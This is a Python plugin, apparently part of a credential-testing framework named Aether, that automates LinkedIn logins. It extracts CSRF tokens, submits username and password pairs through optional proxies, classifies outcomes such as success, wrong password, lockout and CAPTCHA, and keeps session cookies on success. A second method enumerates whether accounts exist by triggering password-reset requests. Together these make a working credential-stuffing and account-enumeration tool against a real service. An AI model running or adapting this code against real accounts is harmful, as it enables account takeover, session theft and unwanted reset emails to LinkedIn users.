"""
Aether LinkedIn Plugin
Full implementation with login flow and session management.
"""

import re
import json
from typing import Optional, Dict, Any
import asyncio

from ...core.plugin_interface import WebPlugin, LoginResult, AuthResult, SessionData


class LinkedInPlugin(WebPlugin):
    """LinkedIn authentication plugin."""
    
    name = "linkedin"
    version = "2.0.0"
    protocols = ["https"]
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        super().__init__(config)
        self.base_url = "https://www.linkedin.com"
        self.login_url = "https://www.linkedin.com/login"
        
    async def login(self, username: str, password: str,
                   session: Optional[Any] = None,
                   proxy: Optional[str] = None) -> LoginResult:
        """
        LinkedIn login with CSRF and session handling.
        """
        import httpx
        from bs4 import BeautifulSoup
        
        start_time = asyncio.get_event_loop().time()
        
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "DNT": "1",
            }
            
            async with httpx.AsyncClient(
                proxies=proxy,
                headers=headers,
                follow_redirects=True,
                timeout=30
            ) as client:
                
                # Step 1: Get login page
                login_page = await client.get(self.login_url)
                soup = BeautifulSoup(login_page.text, 'html.parser')
                
                # Extract CSRF token
                csrf_token = ""
                for input_tag in soup.find_all('input'):
                    if input_tag.get('name') == 'loginCsrfParam':
                        csrf_token = input_tag.get('value', '')
                        break
                
                # Also try to get from cookies
                for cookie in client.cookies.jar:
                    if 'csrf' in cookie.name.lower():
                        csrf_token = cookie.value
                        break
                
                # Step 2: Submit login
                login_data = {
                    'session_key': username,
                    'session_password': password,
                    'loginCsrfParam': csrf_token,
                    'trk': 'guest_homepage-basic_sign-in-submit'
                }
                
                login_resp = await client.post(
                    'https://www.linkedin.com/checkpoint/lg/login-submit',
                    data=login_data,
                    headers={
                        **headers,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Referer': self.login_url
                    }
                )
                
                elapsed = (asyncio.get_event_loop().time() - start_time) * 1000
                
                # Check for success
                if 'feed' in str(login_resp.url) or 'mynetwork' in str(login_resp.url):
                    session_data = SessionData(
                        cookies=dict(client.cookies),
                        user_agent=headers["User-Agent"],
                        proxy_used=proxy
                    )
                    
                    return LoginResult(
                        result=AuthResult.SUCCESS,
                        username=username,
                        password=password,
                        response_time_ms=elapsed,
                        session=session_data
                    )
                
                # Check for challenge/PIN
                if 'challenge' in str(login_resp.url) or 'pin' in login_resp.text.lower():
                    return LoginResult(
                        result=AuthResult.MFA_REQUIRED,
                        username=username,
                        password=password,
                        response_time_ms=elapsed,
                        message="PIN/Challenge required"
                    )
                
                # Check for specific errors
                text = login_resp.text.lower()
                
                if 'wrong password' in text or 'incorrect password' in text:
                    return LoginResult(
                        result=AuthResult.FAILURE,
                        username=username,
                        password=password,
                        response_time_ms=elapsed,
                        message="Invalid password"
                    )
                
                if 'couldn\'t find a linkedin account' in text or \
                   'we don\'t recognize that email' in text:
                    return LoginResult(
                        result=AuthResult.FAILURE,
                        username=username,
                        password=password,
                        response_time_ms=elapsed,
                        message="Account not found"
                    )
                
                if 'too many attempts' in text or 'temporarily restricted' in text:
                    return LoginResult(
                        result=AuthResult.LOCKOUT,
                        username=username,
                        password=password,
                        response_time_ms=elapsed
                    )
                
                # Check for CAPTCHA
                if 'captcha' in text or 'security verification' in text:
                    return LoginResult(
                        result=AuthResult.CAPTCHA,
                        username=username,
                        password=password,
                        response_time_ms=elapsed
                    )
                
                return LoginResult(
                    result=AuthResult.UNKNOWN,
                    username=username,
                    password=password,
                    response_time_ms=elapsed
                )
                
        except Exception as e:
            return LoginResult(
                result=AuthResult.ERROR,
                username=username,
                password=password,
                message=str(e)
            )
    
    async def enumerate(self, username: str,
                       session: Optional[Any] = None,
                       proxy: Optional[str] = None) -> Any:
        """
        LinkedIn username enumeration via forgot password flow.
        """
        from ...core.plugin_interface import EnumerateResult
        
        try:
            import httpx
            
            async with httpx.AsyncClient(proxies=proxy, timeout=10) as client:
                # Check via password reset endpoint
                resp = await client.post(
                    "https://www.linkedin.com/checkpoint/rp/request-password-reset",
                    data={"userName": username},
                    headers={"Content-Type": "application/x-www-form-urlencoded"}
                )
                
                # LinkedIn returns different responses for existing vs non-existing
                if "email has been sent" in resp.text.lower():
                    return EnumerateResult(
                        username=username,
                        exists=True,
                        confidence=0.8,
                        indicators=["Password reset email triggered"]
                    )
                
                elif "we couldn\'t find" in resp.text.lower():
                    return EnumerateResult(
                        username=username,
                        exists=False,
                        confidence=0.7,
                        indicators=["Account not found message"]
                    )
                
                return EnumerateResult(
                    username=username,
                    exists=None,
                    confidence=0.0
                )
                
        except Exception as e:
            return EnumerateResult(
                username=username,
                exists=None,
                confidence=0.0,
                indicators=[str(e)]
            )